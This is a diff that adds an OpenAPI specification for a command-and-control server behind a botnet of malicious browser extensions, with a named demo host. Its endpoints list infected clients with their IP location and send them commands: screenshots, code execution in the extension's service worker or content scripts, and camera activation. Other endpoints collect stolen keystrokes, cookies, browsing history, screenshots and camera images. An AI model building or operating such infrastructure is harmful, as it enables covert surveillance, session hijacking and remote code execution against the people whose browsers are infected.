@@ -1,0 +1,295 @@
+openapi: 3.1.0
+info:
+  title: Extension Botnet C&C server
+  description: Utility API for controlling a botnet run through an array of malicious browser extensions
+  version: 1.0.0
+servers:
+  - url: https://extension-code-injector-production.up.railway.app/
+    description: Demo server
+paths:
+  /clients:
+    get:
+      tags:
+        - clients
+      summary: Get all connected clients
+      description: |-
+        Get a list of all the connected clients to the network.
+        Each client represents a bot in the network, hence a browser extension instance
+        connencted to the server.
+      operationId: get_clients
+      responses:
+        '200':
+          description: Successful Response
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/Client'
+  /clients/send-command:
+    post:
+      tags:
+        - clients
+      summary: Send a command to a set of clients
+      description: Send a command to any number of connected clients
+      operationId: clients_send_command
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                type:
+                  type: array
+                  items:
+                    type: string
+                    enum:
+                      - SCREENSHOT
+                      - BACKGROUND
+                      - CONTENT-SCRIPT
+                      - CAMERA
+                  description: |
+                    The type of command to send. Can be one or more of:
+                    - SCREENSHOT: Take a screenshot
+                    - BACKGROUND: Execute a command on the service worker
+                    - CONTENT-SCRIPT: Execute a command on the content script
+                    - CAMERA: Activate camera
+                command:
+                  type: string
+                  description: The command to send
+                clients:
+                  type: array
+                  items:
+                    type: string
+                  description: List of client IDs to send the command to
+      responses:
+        '200':
+          description: Command sent successfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    examples:
+                      - Command sent
+        '400':
+          description: Bad request due to invalid user input
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    examples:
+                      - Bad request
+  /collector/screenshot:
+    get:
+      tags:
+        - collector
+      summary: Get all the screenshots taken through the botnet
+      description: |-
+        Get a list of all the screenshots taken using this API.
+      operationId: get_screenshots
+      responses:
+        '200':
+          description: Successful Response
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/Image'
+    post:
+      tags:
+        - collector
+      summary: Save a screenshot taken through the botnet
+      operationId: save_screenshot
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                dataUrl:
+                  type: string
+                  description: Base64 encoded image
+      responses:
+        '200':
+          description: Screenshot received sucesfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    examples:
+                      - Screenshot received
+  /collector/camera:
+    get:
+      tags:
+        - collector
+      summary: Get all the camera captures taken through the botnet
+      description: |-
+        Get a list of all the camera captures taken using this API.
+      operationId: get_camera_shots
+      responses:
+        '200':
+          description: Successful Response
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/Image'
+    post:
+      tags:
+        - collector
+      summary: Save a camera capture taken through the botnet
+      operationId: save_camera
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                dataUrl:
+                  type: string
+                  description: Base64 encoded image
+      responses:
+        '200':
+          description: Camera capture received sucesfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    examples:
+                      - Camera capture received
+
+  /collector/key-logger:
+    post:
+      tags:
+        - collector
+      summary: Save stolen key logs from the clients
+      operationId: save_keys
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+      responses:
+        '200':
+          description: Key logs received sucesfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    examples:
+                      - Key logs received
+
+  /collector/cookies:
+    post:
+      tags:
+        - collector
+      summary: Save stolen cookies from the clients
+      operationId: save_cookies
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: array
+      responses:
+        '200':
+          description: Cookies received sucesfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    examples:
+                      - Cookies received
+
+  /collector/history:
+    post:
+      tags:
+        - collector
+      summary: Save stolen history from the clients
+      operationId: save_history
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: array
+      responses:
+        '200':
+          description: History received sucesfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    examples:
+                      - History received
+
+components:
+  schemas:
+    Client:
+      type: object
+      properties:
+        ID:
+          type: string
+          title: ID
+          description: UUID of the client
+        ip_address:
+          type: string
+          title: IP address
+          description: IP address of the client
+        country:
+          type: string
+          title: Country
+          description: Country of the IP
+        city:
+          type: string
+          title: City
+          description: City of the IP
+        zip:
+          type: string
+          title: ZIP
+          description: ZIP code of the IP
+    Image:
+      type: object
+      properties:
+        url:
+          type: string
+          title: URL
+          description: S3 signed URL of the screenshot with expiration
+        name:
+          type: string
+          title: Name
+          description: Name of the image
+          examples:
+            - screenshots/123.jpg
+            - camera/123.jpg
+        created_at:
+          type: string
+          title: Creation timestamp
+          description: Creation timestamp in ISO format
